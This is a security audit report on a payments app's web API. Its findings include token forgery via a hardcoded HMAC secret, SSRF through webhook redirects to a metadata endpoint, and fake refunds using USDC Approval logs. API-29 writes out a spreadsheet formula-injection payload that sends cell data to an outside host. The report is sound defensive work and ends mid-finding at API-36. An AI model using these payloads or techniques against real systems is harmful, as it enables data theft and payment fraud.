# Web API & Server Lib Audit

**Scope:** `apps/web/app/api/**`, `apps/web/lib/**`, `apps/web/middleware.ts`
**Date:** 2026-07-31

## Summary

- The `livemode` invariant is only half-enforced. `lib/org-scope.ts` does a good job on *reads*, but several **write** paths (`checkout`, `customers`, `product_prices`, and the relay's `subscriptions`/`customers` inserts) omit `livemode` entirely and fall through to the column default `false`. A `sk_live_` key therefore creates test-mode rows that the relay then routes to **testnet contracts**.
- Two secrets leak straight out of API responses (webhook signing secret, API key hash), and the customer portal's HMAC key silently degrades to a hardcoded string when `BETTER_AUTH_SECRET` is unset — a real risk for a self-hostable product.
- The refund verification path decodes ERC-20 logs by hand without checking `topics[0]`, so a USDC `Approval` event satisfies `verifyRefund`. A merchant can mark payments refunded without moving funds. Same bug, duplicated in two routes.
- Public checkout endpoints (`PATCH /api/checkout/[id]`, `apply-coupon`, `trial-eligibility`, `fund-wallet`) are unauthenticated *and* unrate-limited, and one of them can mutate `checkout_sessions.amount`.
- Heavy duplication: the webhook HMAC+fetch+record block exists 4×, portal-token verification 11×, `x-forwarded-for` IP parsing 12×, `catch → apiError("invalid_body")` 10×. Error-response shapes and validation discipline are inconsistent between routes written at different times.
- Multi-token support landed but the money math didn't follow: `10_000` (USDC-6 → cents) is hardcoded in tax, analytics and refund verification, and `tax-rates.ts` truncates with `| 0` (int32).

## Finding Counts

| Severity | Count |
|---|---|
| Critical | 4 |
| High | 10 |
| Medium | 19 |
| Low | 5 |

## Findings

### API-01 — Checkout sessions are created without `livemode`; live API keys produce testnet payments

**Severity:** Critical
**File:** `apps/web/app/api/checkout/route.ts:132`
**Problem:** The insert into `checkoutSessions` sets `organizationId`, `productId`, `amount`, etc. but never `livemode`, even though `auth.livemode` is available on line 25's result. `packages/db/src/schema/checkout-sessions.ts:50` declares `livemode: boolean("livemode").notNull().default(false)`, so every session created through the SDK is test-mode. The relay then calls `resolveDeploymentForMode(session.livemode)` (`app/api/checkout/[id]/relay/route.ts:175`), which returns the **base-sepolia** deployment for `false`. A merchant integrating with `sk_live_` gets checkout links that transact in mock USDC on a testnet. The same omission repeats at `app/api/customers/route.ts:53` (manual customers), `app/api/products/route.ts:162` and `app/api/products/[id]/route.ts:134` (`product_prices`), and `app/api/checkout/[id]/relay/route.ts:347` / `:406` (relay-created customers and trial subscriptions).
**Fix:** Add `livemode: auth.livemode` to the checkout insert and `livemode` to each of the other five inserts. Then add a repo-wide guard: make `livemode` `.notNull()` with **no default** in the schema so Drizzle's insert types force every call site to supply it.
**Effort:** S

### API-02 — Portal token HMAC falls back to a hardcoded secret

**Severity:** Critical
**File:** `apps/web/lib/portal-tokens.ts:4`
**Problem:** `return process.env.BETTER_AUTH_SECRET || "paylix-portal-fallback-secret";` — on any deployment that hasn't set `BETTER_AUTH_SECRET`, portal tokens are signed with a constant published in this repo. Anyone can forge `signPortalToken(<any customer uuid>)` and then read full billing history (`app/api/portal/[customerId]/route.ts:23`), cancel subscriptions on the relayer's gas (`app/api/portal/cancel-subscription/route.ts:31`), and file refund requests. `app/api/public/unsubscribe/route.ts:9` has the same shape with `?? ""` — an empty HMAC key.
**Fix:** Throw at module load when the secret is missing: `const s = process.env.BETTER_AUTH_SECRET; if (!s || s.length < 32) throw new Error("BETTER_AUTH_SECRET is required")`. Do the same in `public/unsubscribe/route.ts`.
**Effort:** S

### API-03 — Refund verification decodes any 3-topic log as a Transfer; USDC `Approval` passes

**Severity:** Critical
**File:** `apps/web/app/api/payments/[id]/refund/route.ts:214`
**Problem:** `decodeTransfer` checks only `log.topics.length < 3` and then reads `topics[1]`/`topics[2]` as `from`/`to` and `log.data` as `value`. It never compares `topics[0]` to the `Transfer` event hash — line 216-217 (`const sig = event as ...; void sig;`) is a stub that discards the signature. `verifyRefund` (`apps/web/lib/verify-refund.ts:72-84`) only filters on token address. USDC's `Approval(owner, spender, value)` is also a 3-topic event on the same contract, so a merchant can submit a tx that merely calls `USDC.approve(buyerAddress, amount)` from their payout wallet — no funds move — and the route records a confirmed refund and increments `payments.refunded_cents`. `app/api/refund-requests/[id]/approve/route.ts:88-98` has the identical hand-rolled decode with no signature check at all.
**Fix:** Use viem's `parseEventLogs({ abi: erc20Abi, eventName: "Transfer", logs: receipt.logs })` in both routes, or at minimum compare `log.topics[0]` against `keccak256("Transfer(address,address,uint256)")`. Extract into one shared `decodeTransferLogs(receipt)` helper so the two routes can't drift again.
**Effort:** S

### API-04 — `PATCH`/`POST /api/checkout/[id]` is unauthenticated and can change the session amount

**Severity:** Critical
**File:** `apps/web/app/api/checkout/[id]/route.ts:107`
**Problem:** There is no auth check, no rate limit, and no session-state guard on this handler; `middleware.ts:13` explicitly exempts `/api/checkout` from the CSRF check, and `line 270` aliases `POST = PATCH`. Anyone who has a session id (it appears in the checkout URL) can overwrite `buyerEmail`, `buyerPhone`, `buyerFirstName/LastName`, `buyerTaxId` — the PII the trial anti-abuse dedup keys on — on any org's session. Worse, supplying `customer.country` drives the tax recompute at `:167-217`, which writes `sessionPatch.amount` (`:206`/`:214`). Setting a zero-VAT country strips the tax from `amount` before the buyer signs. The body is typed `CustomerFormPayload` with all fields `unknown` and validated only by `cleanString` — there is no zod schema and no length cap, so arbitrary-length strings land in the DB.
**Fix:** Require a proof of session possession (the session id alone is weak — it is in the URL bar). At minimum: reject when `status` is not `active`/`awaiting_currency`/`viewed`, refuse when `relayInFlightAt` is set, add an IP rate limit, and add a zod schema with `.max()` on every string. The tax recompute should not be reachable from an unauthenticated write — move it server-side into `pick-currency` or recompute it at relay time from the stored country.
**Effort:** M

### API-05 — Trial relay dereferences `permitValue!` before the scheme guard runs

**Severity:** High
**File:** `apps/web/app/api/checkout/[id]/relay/route.ts:383`
**Problem:** The trial branch builds `pendingPermitSignature` with `permitValue!.toString()`, `v!`, `r!`, `s!`. The comment on `:377-380` claims "the eip2612 guard at the top of the route ensures these fields are non-null" — but that guard is at `:565`, and the trial branch returns at `:451`, long before it. `parseRelayBody` leaves `permitValue`/`v`/`r`/`s` as `null` whenever the request carries a Permit2 or DAI-permit shape (`validation.ts:182`). A trial checkout on any Permit2 token therefore throws `TypeError: Cannot read properties of null` and returns an unhandled 500.
**Fix:** Move the `scheme === "eip2612"` field check (`:565-576`) above the trial branch, and return the existing `scheme_not_supported` error for trials on non-2612 tokens. Delete the stale comment.
**Effort:** S

### API-06 — Trial relay path has no lock; concurrent requests create duplicate trial subscriptions

**Severity:** High
**File:** `apps/web/app/api/checkout/[id]/relay/route.ts:481`
**Problem:** `acquireRelayLock` is only called at `:481`, *after* the trial branch has already returned at `:451`. The trial path is a read-then-write: `checkExistingSubscription` at `:305`, customer upsert at `:337-375`, `subscriptions` insert at `:406`, session update at `:426`. Two simultaneous POSTs both pass the dedup check and both insert a `trialing` row with stored permit signatures, which the trial converter later replays twice — two on-chain subscriptions for one buyer. The customer lookup/insert at `:337-361` is the same check-then-insert with no `onConflictDoNothing`.
**Fix:** Call `acquireRelayLock(db, sessionId)` before the `isTrial` computation, and release it on every trial-branch early return. Use `.onConflictDoUpdate` keyed on `(organizationId, customerId)` for the customer upsert (`app/api/checkout/[id]/route.ts:238` already does this correctly).
**Effort:** M

### API-07 — `GET /api/webhooks/[id]` returns the webhook signing secret

**Severity:** High
**File:** `apps/web/app/api/webhooks/[id]/route.ts:55`
**Problem:** `db.select().from(webhooks)` with no column list, returned verbatim at `:63`. The list endpoint (`app/api/webhooks/route.ts:51-60`) and the PATCH response (`:95-104`) both carefully exclude `secret` with an explicit comment — the single-fetch GET does not. Any dashboard user in the org, and anything that proxies this response (browser devtools, client-side caching, error reporters), sees the HMAC key that authenticates every webhook Paylix sends.
**Fix:** Replace `.select()` with the same explicit column list used at `app/api/webhooks/route.ts:51-59`.
**Effort:** S

### API-08 — `POST /api/keys` returns the stored key hash alongside the plaintext key

**Severity:** High
**File:** `apps/web/app/api/keys/route.ts:80`
**Problem:** `NextResponse.json({ ...row, key }, ...)` where `row` comes from `.returning()` with no column list (`:68`). The response therefore includes `keyHash` (and `previousKeyHash`). `authenticateApiKey` looks up rows by `eq(apiKeys.keyHash, hash)` (`lib/api-auth.ts:40`) — the hash *is* the credential as far as that query is concerned. Anyone who captures this response body has the value that a DB-level attacker would need.
**Fix:** Return an explicit projection: `{ id, name, prefix, type, livemode, createdAt, key }`. Same treatment for the rotate response, which already projects correctly at `app/api/keys/[id]/rotate/route.ts:87-94`.
**Effort:** S

### API-09 — No role checks anywhere; any org member can change the payout wallet

**Severity:** High
**File:** `apps/web/app/api/settings/route.ts:234`
**Problem:** `member.role` is read in exactly one place in the entire API surface (`app/api/settings/team/route.ts:35`, and only to render an `isOwner` flag). `resolveActiveOrg` returns an `organizationId` with no role attached (`lib/require-active-org.ts:32-63`). The `merchantPayoutWallets` upsert at `:234-253` — which decides where every future payment is sent — is gated only on "has a session with an active org". The same is true for `POST /api/keys` (mint a `sk_live_` key), `POST /api/payments/[id]/refund`, `POST /api/subscriptions/gift`, and `POST /api/user/delete`. Since `lib/auth.ts:42-71` enables invitations, a `member`-role invitee can redirect the merchant's funds.
**Fix:** Add `requireRole(ctx, ["owner", "admin"])` to `lib/require-active-org.ts` (join `member` on `organizationId + userId`) and apply it to payout-wallet writes, API-key creation/rotation/revocation, refunds, gifts, and team management.
**Effort:** M

### API-10 — SVG logo upload is served from the app origin → stored XSS

**Severity:** High
**File:** `apps/web/app/api/upload/logo/route.ts:11`
**Problem:** `image/svg+xml` is in the `ALLOWED` set, the file is written to `public/uploads/logos/` (`:40-42`), and the returned URL (`:43`) is same-origin. SVG is an active document format — a file containing `<script>` executes with the app's origin when loaded directly, and the resulting URL is stored as `merchantProfiles.logoUrl` and rendered on invoices. `file.type` comes from the client's multipart headers; there is no magic-byte sniffing, so the extension chosen at `:38` is attacker-influenced. There is also no org scoping or rate limit — any authenticated user can fill the disk 512 KB at a time.
**Fix:** Drop `image/svg+xml` from `ALLOWED`, or sanitize with DOMPurify + serve uploads from a separate origin/CDN with `Content-Disposition: attachment`. Verify the magic bytes rather than trusting `file.type`, and rate-limit per user.
**Effort:** M

### API-11 — Webhook delivery follows redirects and never re-validates the URL → SSRF

**Severity:** High
**File:** `apps/web/lib/webhook-dispatch.ts:51`
**Problem:** `validateWebhookUrl` runs only at create/update time (`app/api/webhooks/route.ts:88`, `app/api/webhooks/[id]/route.ts:85`). The four places that actually `fetch` the merchant URL — `lib/webhook-dispatch.ts:51`, `app/api/webhooks/[id]/send-test/route.ts:103`, `app/api/webhooks/deliveries/[id]/replay/route.ts:73`, `app/api/webhooks/[id]/test/route.ts:58` — pass no `redirect` option, so Node's default `follow` applies. A merchant registers `https://attacker.com/hook` (passes validation), which 302s to `http://169.254.169.254/latest/meta-data/`; the response body is not returned, but the request is made from inside the network. DNS rebinding gets the same result without a redirect, since `lib/url-safety.ts:43` resolves the name once at registration. `url-safety.ts:43` also uses `lookup()` without `{ all: true }`, so only the first A record is checked, and `100.64.0.0/10` (CGNAT) and `::ffff:` IPv4-mapped forms are missing from `BLOCKED_CIDRS`.
**Fix:** Set `redirect: "manual"` on all four fetches and treat 3xx as a delivery failure. Re-run `validateWebhookUrl` immediately before each send. Add `{ all: true }` to `lookup` and check every returned address, plus the missing ranges.
**Effort:** M

### API-12 — `lib/deployment.ts` hardcodes `base` / `base-sepolia`, bypassing `lib/chain.ts`

**Severity:** High
**File:** `apps/web/lib/deployment.ts:32`
**Problem:** `resolveDeploymentForMode` picks `NETWORKS["base"]` for livemode and `NETWORKS["base-sepolia"]` otherwise (`:48`), reading `BASE_RPC_URL` / `BASE_SEPOLIA_*` env vars directly. `lib/chain.ts` exists precisely to be the single point of network selection ("Don't reintroduce `baseSepolia` / `84532` hardcodes — flipping `NEXT_PUBLIC_NETWORK=base` must switch the whole app at once"), and it even exports `getNetworkForMode(livemode)` (`chain.ts:54`) which throws on a mode/network mismatch. Nothing in the API layer calls it: `resolveDeploymentForMode` is used by the relay, both refund routes, both portal cancel routes, backup-payer, cancel-gasless, and both faucet routes. Setting `NEXT_PUBLIC_NETWORK=polygon` switches the client and leaves every server-side write on Base.
**Fix:** Rewrite `resolveDeploymentForMode` in terms of `getNetworkForMode(livemode)` and resolve contract addresses through the network registry's `addressEnvVar` indirection instead of the hardcoded `BASE_*` names.
**Effort:** M

### API-13 — `10_000` base-units-per-cent is hardcoded across tax, analytics and refunds

**Severity:** High
**File:** `apps/web/app/api/checkout/[id]/route.ts:189`
**Problem:** `const SCALE = 10_000; const subInt = Number(baseAmount / BigInt(SCALE));` converts a native-unit `bigint` to "cents" assuming 6 decimals. `checkout_sessions.amount` is now per-token native units, so for an 18-decimal token (WETH/DAI) `subInt` is off by 10^12 — the resulting `taxAmount` at `:201` is nonsense and gets written to `sessionPatch.amount`. The same constant appears at `app/api/analytics/route.ts:94` (`Number(r.priceAmount) / 10_000` for MRR — the comment on `:56-58` admits it) and as `baseUnitsPerCent: 10_000n` at `app/api/payments/[id]/refund/route.ts:146` and `app/api/refund-requests/[id]/approve/route.ts:110`, where a non-USDC refund would be validated against the wrong magnitude.
**Fix:** Derive the scale from `getToken(networkKey, tokenSymbol).decimals` — `app/api/checkout/[id]/apply-coupon/route.ts:118-126` already does exactly this and is the model to copy. Add a shared `baseUnitsPerCent(decimals)` helper in `lib/amounts.ts`.
**Effort:** M

### API-14 — `resolveTax` truncates the subtotal with a 32-bit bitwise OR

**Severity:** High
**File:** `apps/web/lib/tax-rates.ts:131`
**Problem:** `const subtotal = Math.max(0, input.subtotalCents | 0);` — `| 0` coerces to int32. Any subtotal above 2,147,483,647 cents wraps to a negative number, which `Math.max(0, ...)` then flattens to `0`, silently returning `null` (no tax). Given API-13 feeds this function values inflated by 10^12 for 18-decimal tokens, this is reachable with a $1 WETH price, not just a $21M invoice.
**Fix:** `const subtotal = Math.max(0, Math.trunc(input.subtotalCents));` and reject non-finite input explicitly.
**Effort:** S

### API-15 — `refunds` insert and `payments.refunded_cents` increment are not in a transaction

**Severity:** Medium
**File:** `apps/web/app/api/payments/[id]/refund/route.ts:157`
**Problem:** The refund row is inserted at `:157-169` and `payments.refundedCents` is bumped by a separate statement at `:174-180`. If the process dies between them, the refund exists but the payment still shows `refunded_cents = 0`, so `verifyRefund`'s over-refund guard (`lib/verify-refund.ts:57`) passes again and the merchant can record a second full refund. `app/api/refund-requests/[id]/approve/route.ts:118` gets this right with `db.transaction` — the two routes disagree.
**Fix:** Wrap `:157-180` in `db.transaction`, matching the approve route.
**Effort:** S

### API-16 — Refund tx-hash dedup query is not org-scoped

**Severity:** Medium
**File:** `apps/web/app/api/payments/[id]/refund/route.ts:88`
**Problem:** `.from(refunds).where(eq(refunds.txHash, parsed.data.txHash))` has no `organizationId` filter. A merchant who guesses or observes another org's refund tx hash gets a `409 duplicate` instead of a validation error — a cross-tenant existence oracle. It also means a legitimate refund is blocked if an unrelated org happens to have recorded the same hash.
**Fix:** Add `orgScope(refunds, { organizationId, livemode })` to the where clause. Keep the unique index as the hard guard.
**Effort:** S

### API-17 — `checkExistingSubscription` ignores `livemode`

**Severity:** Medium
**File:** `apps/web/app/api/checkout/[id]/relay/dedup.ts:83`
**Problem:** The query filters on `organizationId`, `productId`, status and identity, but never `subscriptions.livemode`. The trial-abuse rule is "one trial per product per identity, ever" — with modes conflated, a merchant testing their own trial flow in test mode permanently burns that wallet/email for live mode, and vice versa. Every other query in the codebase goes through `orgScope`, which exists specifically so `livemode` can't be forgotten.
**Fix:** Thread `livemode` through `checkExistingSubscription`'s args and use `orgScope(subscriptions, { organizationId, livemode })`. Callers at `relay/route.ts:305`/`:455` and `trial-eligibility/route.ts:74` already have `session.livemode` in scope.
**Effort:** S

### API-18 — `GET /api/checkout/[id]/trial-eligibility` is an unauthenticated email-enumeration oracle

**Severity:** Medium
**File:** `apps/web/app/api/checkout/[id]/trial-eligibility/route.ts:16`
**Problem:** No auth, no rate limit. The caller supplies an arbitrary `?email=` and `?buyer=` and the response's `eligible` flag reveals whether that email or wallet already has *any* subscription (including `cancelled`) with the merchant — `dedup.ts:64-73` matches across all statuses for `intent: "trial"`. That is a customer-list membership check for anyone with a checkout link. Each request also fires two RPC calls via `checkWalletActivity` (`:60`), so it doubles as an unmetered proxy against the configured node.
**Fix:** Rate-limit per IP (the relay route's `checkRateLimitAsync(\`relay:${ip}\`, ...)` at `relay/route.ts:85` is the pattern), and only consider the email already stored on the session (`checkoutSessions.buyerEmail`) rather than one supplied in the query string.
**Effort:** S

### API-19 — `POST /api/checkout/[id]/fund-wallet` is a fully unauthenticated faucet

**Severity:** Medium
**File:** `apps/web/app/api/checkout/[id]/fund-wallet/route.ts:14`
**Problem:** The only gate is "a test-mode checkout session with this id exists" (`:20-39`). No API key, no rate limit, no per-session cap, and `organizationId: null` on the recorded mint (`:97`), so per-org accounting is impossible. Anyone with any test session id can mint to arbitrary addresses until the global window cap in `checkFaucetLimits` is hit — which is a denial of service against every other tester. The limit check itself (`:59-83`) reads counts and then mints and inserts at `:85-100` with nothing atomic in between, so concurrent requests all read the same pre-mint totals.
**Fix:** Require the address to match a wallet already associated with the session, add an IP rate limit, record `organizationId` from the session, and make the limit check atomic (Redis `INCR` or an `INSERT ... WHERE NOT EXISTS` reservation before minting). `app/api/test/faucet/route.ts:49-90` has the identical race.
**Effort:** M

### API-20 — Faucet accepts publishable (`pk_`) keys

**Severity:** Medium
**File:** `apps/web/app/api/test/faucet/route.ts:12`
**Problem:** `authenticateApiKey(request, undefined, {...})` — passing `undefined` for `requiredType` means a `pk_test_` key is accepted. Publishable keys are by definition embeddable in client-side code, so any visitor to a merchant's checkout page can extract one and drive the org's faucet allocation. Every other key-authenticated route in the codebase passes `"secret"`.
**Fix:** `authenticateApiKey(request, "secret", { key: "faucet", perMinute: 10 })`, or if the faucet is deliberately client-callable, add a per-IP limit on top of the per-key one.
**Effort:** S

### API-21 — `apply-coupon` is unauthenticated, unrate-limited, and its `DELETE` has no state guard

**Severity:** Medium
**File:** `apps/web/app/api/checkout/[id]/apply-coupon/route.ts:18`
**Problem:** POST distinguishes `not_found` (`:57`) from `coupon_invalid` (`:92`), which makes the endpoint a coupon-code enumerator against an org's whole coupon table with no rate limit. The `DELETE` handler at `:182` checks only that the session exists — not `status`, not `expiresAt`, not `relayInFlightAt` — and then rewrites `amount` and nulls `subtotalAmount` (`:194-202`). Calling it against a `completed` session mutates the recorded amount after payment.
**Fix:** Add the same `checkRateLimitAsync` guard the relay uses, collapse `not_found` into the generic `coupon_invalid` response, and copy the `status`/`expiresAt` guards from `:36-41` into the `DELETE` handler.
**Effort:** S

### API-22 — `subtotalAmount` means two different things; coupon + tax interact wrongly

**Severity:** Medium
**File:** `apps/web/app/api/checkout/[id]/apply-coupon/route.ts:98`
**Problem:** `apply-coupon` treats `subtotalAmount` as *pre-discount* (`const subtotal = session.subtotalAmount ?? session.amount`), while the tax code in `app/api/checkout/[id]/route.ts:186` treats it as *pre-tax* (`const baseAmount: bigint = full.subtotalAmount ?? full.amount`). Apply a coupon first and `subtotalAmount` holds the tax-inclusive figure; the subsequent country change then charges VAT on a VAT-inclusive base. Do it in the other order and `apply-coupon` overwrites the tax snapshot, so `DELETE` at `:199` restores a pre-tax amount while `taxAmount`/`taxRateBps`/`taxLabel` stay populated and stale.
**Fix:** Split the column: keep `subtotalAmount` as the immutable pre-discount, pre-tax base, and add `discountedSubtotalAmount`. Recompute `amount = subtotal - discount + tax` from one function that both routes call.
**Effort:** M

### API-23 — `pick-currency` can rewrite the amount of an `active` session mid-relay and silently orphans an applied coupon

**Severity:** Medium
**File:** `apps/web/app/api/checkout/[id]/pick-currency/route.ts:116`
**Problem:** The handler accepts `status === "active"` (`:67`) and unconditionally overwrites `amount` with `price.amount * qty`. It does not check `relayInFlightAt`, so it can fire while a relay is submitting. It also leaves `appliedCouponId`, `discountCents` and `subtotalAmount` untouched — the discount vanishes from `amount` but the relay's coupon bookkeeping at `relay/route.ts:792-838` still increments `redemptionCount` and writes a `couponRedemptions` row for a discount that was never applied. Separately, `:110-114` re-queries the session for `quantity` when `:56` already fetched the whole row.
**Fix:** Reject when `relayInFlightAt` is non-null, clear `appliedCouponId`/`discountCents`/`subtotalAmount`/tax columns on a currency change, and read `quantity` from the row already loaded at `:56`.
**Effort:** S

### API-24 — Webhook send logic is copy-pasted into four places

**Severity:** Medium
**File:** `apps/web/lib/webhook-dispatch.ts:34`
**Problem:** The same ~35-line block — build `t=<ts>,v1=<hmac>`, insert a `pending` `webhookDeliveries` row, `fetch` with a 10 s `AbortSignal.timeout`, flip status to `delivered`/`failed` — appears at `lib/webhook-dispatch.ts:34-76`, `app/api/webhooks/[id]/send-test/route.ts:86-142`, `app/api/webhooks/deliveries/[id]/replay/route.ts:54-110`, and `app/api/webhooks/[id]/test/route.ts:50-87`. They have already drifted: three send `User-Agent: Paylix-Webhook/1.0` and one doesn't; two set `livemode` on the delivery row and two don't (`webhook-dispatch.ts:41-47`, `webhooks/[id]/test/route.ts:77-84`); `test/route.ts:62` uses `X-Paylix-Signature` while the others use lowercase `x-paylix-signature`. Any SSRF or signature fix has to be made four times.
**Fix:** Extract `deliverWebhook({ webhook, event, payload, headers })` into `lib/webhook-dispatch.ts` and have all four call it.
**Effort:** M

### API-25 — Webhooks are delivered inline, once, with no retry

**Severity:** Medium
**File:** `apps/web/lib/webhook-dispatch.ts:34`
**Problem:** `dispatchWebhooks` loops over matching webhooks sequentially and `await`s each `fetch` with a 10 s timeout. With five registered endpoints that is up to 50 s inside a request. Callers work around this with `void dispatchWebhooks(...)` (`relay/route.ts:435`, `payments/[id]/refund/route.ts:196`, `subscriptions/gift/route.ts:135`, and 8 more), which on a serverless runtime means the work is cancelled the moment the response is returned. `attempts` is hardcoded to `1` at `:67` and `:73` and nothing ever re-reads `status = 'failed'` rows, so a single transient 502 loses the event permanently — despite `webhookDeliveries.attempts` existing for exactly this.
**Fix:** Write the `pending` delivery rows synchronously and hand the actual sending to a queue/worker (the indexer process already runs a keeper loop and could own a retry sweep with exponential backoff on `attempts`).
**Effort:** L

### API-26 — Portal token verification and ownership checks duplicated across 11 routes

**Severity:** Medium
**File:** `apps/web/app/api/portal/cancel-trial/route.ts:29`
**Problem:** `verifyPortalToken(token, customerId)` followed by a "not your subscription" comparison is hand-written in `portal/cancel-trial/route.ts:29-54`, `portal/cancel-subscription/route.ts:31-51`, `portal/[customerId]/route.ts:23`, `portal/invoices/route.ts:11`, `portal/refund-requests/route.ts:33` and `:97`, `portal/wallets/route.ts:23` and `:40`, `portal/subscriptions/[id]/backup-payer/route.ts:46-69`, plus `cancel-at-period-end`, `pause-subscription`, `resume-subscription`, `resume-schedule` and `notifications`. The variants already differ: some take the token from the body, some from the query string; some return `{code:"invalid_token"}`, some `{code:"unauthorized"}`; `backup-payer:64-69` does the ownership check with a redundant double-`eq` on the same column rather than comparing in JS.
**Fix:** Add `lib/portal-auth.ts` exporting `requirePortalCustomer(request): Promise<{customerId} | NextResponse>` and `requireOwnedSubscription(customerId, subscriptionId)`, and route all 11 through it.
**Effort:** M

### API-27 — Portal tokens are passed in URL query strings and live 30 days

**Severity:** Medium
**File:** `apps/web/app/api/customers/[id]/portal-url/route.ts:48`
**Problem:** The generated link is `${baseUrl}/portal/${customer.id}?token=${token}`, and `portal/[customerId]/route.ts:22`, `portal/invoices/route.ts:10`, `portal/wallets/route.ts:19` and `portal/refund-requests/route.ts:92` all read the token from `searchParams`. Query strings land in access logs, proxy logs, browser history and the `Referer` header of any outbound link on the portal page. The token is valid for 30 days (`lib/portal-tokens.ts:8`) and has no revocation path.
**Fix:** Have the portal page exchange the link token once for an httpOnly, `SameSite=Lax` cookie, then read the cookie in the API routes. Shorten the link token's life to hours and mark it single-use.
**Effort:** M

### API-28 — `wallet-activity.ts` reads an undeclared env var and fails open on every error

**Severity:** Medium
**File:** `apps/web/lib/wallet-activity.ts:14`
**Problem:** `transport: http(process.env.RPC_URL)` — `RPC_URL` is not the variable used anywhere else; `lib/deployment.ts:41`/`:53` use `BASE_RPC_URL` / `BASE_SEPOLIA_RPC_URL`. When it is undefined, viem silently falls back to the chain's default public RPC. Both failure paths (`:20-22`, `:42-44`) plus the unknown-network (`:10`) and unknown-token (`:26`) paths return `{ active: true }`. So a rate-limited or misconfigured RPC disables the documented "wallets with zero on-chain history are blocked from trials" anti-abuse layer with no log line.
**Fix:** Take the RPC URL from `resolveDeploymentForMode(livemode).rpcUrl` (the callers at `relay/route.ts:286` and `trial-eligibility/route.ts:60` both have the mode). Log at `warn` on the fail-open branches so the degradation is visible.
**Effort:** S

### API-29 — CSV export does not neutralize formula injection

**Severity:** Medium
**File:** `apps/web/lib/csv.ts:22`
**Problem:** `formatCell` quotes only on `[",\r\n]`. Values beginning with `=`, `+`, `-`, `@`, tab or CR are emitted raw. Every exported field is buyer-controlled or buyer-influenced: `customers/export/route.ts:49-58` writes `email`, `firstName`, `lastName`, `phone`, `taxId`; `payments/export`, `invoices/export` and `subscriptions/export` write metadata via `metadataCells` (`csv.ts:40`). A buyer named `=HYPERLINK("http://x/?"&A1,"click")` executes when the merchant opens the export in Excel or Sheets.
**Fix:** In `formatCell`, prefix a `'` (or wrap in quotes and prefix a tab) when the rendered string starts with `=+-@\t\r`.
**Effort:** S

### API-30 — `settings` PATCH has no schema validation and 500s on malformed JSON

**Severity:** Medium
**File:** `apps/web/app/api/settings/route.ts:125`
**Problem:** `const body = await request.json();` with no `.catch()` — invalid JSON throws and Next returns an unhandled 500 rather than a 400. The 280-line handler then validates ad hoc: `businessProfile` fields are coerced with `String(bp.legalName ?? "")` (`:263`), so `{"legalName":{}}` stores `"[object Object]"`, with no length caps on any field; `logoUrl` (`:271`) is accepted as any string and later rendered on invoices; `xpub` (`:222`) is validated only by `length < 100`. The same missing `.catch()` appears at `app/api/products/[id]/route.ts:58`, `app/api/webhooks/[id]/route.ts:75`, `app/api/keys/route.ts:48`, `app/api/checkout-links/route.ts:59` and `app/api/checkout/[id]/fund-wallet/route.ts:43`.
**Fix:** Define a zod schema for the whole settings body (the other create routes already do this) and parse with `safeParse`. Add a shared `readJsonBody(request)` helper returning `{ok:false, response}` on parse failure and use it in all six routes.
**Effort:** M

### API-31 — `BigInt(p.amount)` on unvalidated strings throws inside a transaction

**Severity:** Medium
**File:** `apps/web/app/api/products/route.ts:167`
**Problem:** `prices[].amount` is typed `z.string()` (`:40`) with no format constraint, then passed to `BigInt(p.amount)` inside `db.transaction`. `"abc"` throws `SyntaxError` → uncaught → 500 instead of a 400, and `"-5000"` is accepted, creating a negative price that flows into `pick-currency`'s `price.amount * BigInt(qty)`. `app/api/products/[id]/route.ts:141` has the same problem, and `:122-126` additionally calls `assertValidNetworkKey` **inside** the transaction with no try/catch, while the POST route wraps the identical call in try/catch at `:130-138` to return a proper 400.
**Fix:** Change the schema to `z.string().regex(/^\d+$/)` with a `.refine` for a sane upper bound, and move the network/token assertions above `db.transaction` in the PATCH route to match POST.
**Effort:** S

### API-32 — Middleware CSRF block is duplicated and the second copy is dead

**Severity:** Medium
**File:** `apps/web/middleware.ts:36`
**Problem:** Lines 10-28 and 36-52 are the same CSRF check verbatim. The second copy is unreachable in its exempt form: line 9 returns for every `/api/` path, so `path.startsWith("/api/checkout") || path.startsWith("/api/portal")` at `:39` is always `false` when evaluated. Both copies also allow the request through when the `Origin` header is absent (`!isExempt && origin && ...`), so a non-browser client bypasses the check entirely — the protection rests solely on the session cookie's `SameSite` attribute, which `lib/auth.ts:38-41` never configures.
**Fix:** Extract one `isCsrfRejected(request)` helper, delete the dead exemption in the page branch, and set `session.cookieOptions.sameSite = "lax"` explicitly in `lib/auth.ts`.
**Effort:** S

### API-33 — `POST /api/user/delete` hard-deletes with no confirmation, re-auth, or audit trail

**Severity:** Medium
**File:** `apps/web/app/api/user/delete/route.ts:17`
**Problem:** `await db.delete(user).where(eq(user.id, session.user.id));` — one line, no password re-entry, no `recordAudit` call (unlike `customers/[id]/delete/route.ts:27`, which soft-deletes *and* audits), and no handling of organizations where this user is the sole `owner`, which are left with no administrator. The contrast with the customer delete route — soft delete via `deletedAt` — is telling: user data gets harder treatment than customer data.
**Fix:** Require a fresh password/session confirmation, refuse when the user solely owns an org with data, soft-delete, and write an audit record.
**Effort:** M

### API-34 — `x-forwarded-for` is trusted verbatim for rate limiting and audit IPs

**Severity:** Low
**File:** `apps/web/app/api/checkout/[id]/relay/route.ts:84`
**Problem:** `const ip = forwardedFor?.split(",")[0]?.trim() || "unknown"` takes the *first* (client-supplied, leftmost) entry, so `X-Forwarded-For: <random>` defeats the relay's 10/min limit on every request. The identical expression is repeated in 12 audit call sites (`keys/route.ts:77`, `webhooks/route.ts:121`, `settings/route.ts:372` and `:397`, `products/route.ts:182`, `products/[id]/route.ts:169`, `blocklist/route.ts:111`, `payment-links/route.ts:99`, `payments/[id]/refund/route.ts:193`, `refund-requests/[id]/approve/route.ts:165`, `subscriptions/gift/route.ts:132`, `subscriptions/[id]/comp-charge/route.ts:93`), poisoning the audit log's `ipAddress` column.
**Fix:** Add `lib/client-ip.ts` that takes the *rightmost* untrusted hop (or the Nth from the right, configured by `TRUSTED_PROXY_HOPS`) and use it everywhere.
**Effort:** S

### API-35 — `app/api/webhooks/[id]/test/route.ts` is dead code

**Severity:** Low
**File:** `apps/web/app/api/webhooks/[id]/test/route.ts:10`
**Problem:** Nothing references this route — the dashboard calls `send-test` (`app/(dashboard)/webhooks/page.tsx:198`). It is a strictly worse duplicate: the payload shape (`{id, type, data}`) doesn't match the real envelope (`{event, timestamp, data}`) used by `lib/webhook-dispatch.ts:27`, the delivery row it writes at `:75-85` omits `livemode`, and it has no rate limit or idempotency wrapper.
**Fix:** Delete the file.
**Effort:** S

### API-36 — `decodeTransfer`'s dead signature stub

**Severity:** Low
